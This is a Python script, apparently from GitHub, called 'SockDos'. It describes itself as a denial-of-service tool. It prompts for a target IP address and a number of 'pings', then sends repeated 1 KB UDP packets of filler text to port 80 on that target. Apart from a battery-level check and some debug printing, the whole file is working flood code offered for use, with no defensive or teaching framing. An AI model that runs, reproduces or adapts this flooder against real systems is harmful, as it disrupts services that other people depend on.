#!/bin/python3

# SockDos - Denial of Service tool using sockets
# neek8044 on GitHub

import socket
import time
import sys
import psutil


__version__ = "v1.4.1"

debugging   = False
running     = False

print("SockDos", __version__, "[DEBUG MODE]" if debugging else ..., "\nCoded by Neek8044")


# Gets current battery percentage
battery = psutil.sensors_battery()
plugged = battery.power_plugged
battery = battery.percent


# Socket configuration
UDP = socket.SOCK_DGRAM
s = socket.socket(socket.AF_INET, UDP)


# Required data for sockets
PORT = 80
MSG = "A cat is fine too. Desudesudesu~" # Default message
PACKET_SIZE_BYTES = 1024
LEN = len(MSG)  # Length of message

PSB = PACKET_SIZE_BYTES if PACKET_SIZE_BYTES > LEN else LEN # Packet size in bytes

# Calculates the message output depending on PSB (packet size)
MUL = PSB // LEN                # Multiplier to get specified packet size
MOD = PSB % LEN                 # Modulo if PSB is set to a weird number
MSG = MSG * MUL + "~" * MOD     # Calculates message
LEN = len(MSG)


# Message to show in the console before exiting program
def escape(message="Press enter to exit..."):
    input(message)
    sys.exit()


def get_pings():
    global loops
    # Asking the user for amount of pings and validates the input
    valid = False
    while not valid:
        try:
            loops = int(input("[?] Pings: "))
            valid = True
        except:
            continue


def get_inputs():
    global IP
    ip_input = input("[?] Target IP: ")
    IP = ip_input if len(ip_input.split(".")) == 4 else escape(
        "Invalid IP input. Press enter and run again to reset..."
        )
    get_pings()
    

def start_sending(loops:int, MSG:str):
    global running
    for i in range(loops):
        s.send(MSG.encode())
        print(f"Sent: ( {i+1} / {loops} )", end="\r")
    else:
        running = False
        print("\n")


def main():
    print(MSG) if debugging else ...
    print("Set packet size:", str(LEN / 1024) + "KBs")

    get_inputs()

    start = time.time()
    print("Started timer.") if debugging else ...

    # Checks if the IP address is valid to connect to
    try:
        s.connect((IP, PORT))
    except socket.error:
        escape("ERROR: Could not connect to given IP address.\nPress enter to exit...")

    # Runs main function to send packets
    running = True
    start_sending(loops, MSG)
    s.close()

    # Finish message to show after completion
    print("Finished in %s seconds." % str(time.time() - start)) if not running else ...
    escape()


if __name__ == "__main__":
    print(battery, not plugged)
    escape(
        "\n[ERROR] Low battery level. Please plug in your device and restart..."
        ) if (battery < 20) and not plugged else ...
    main()
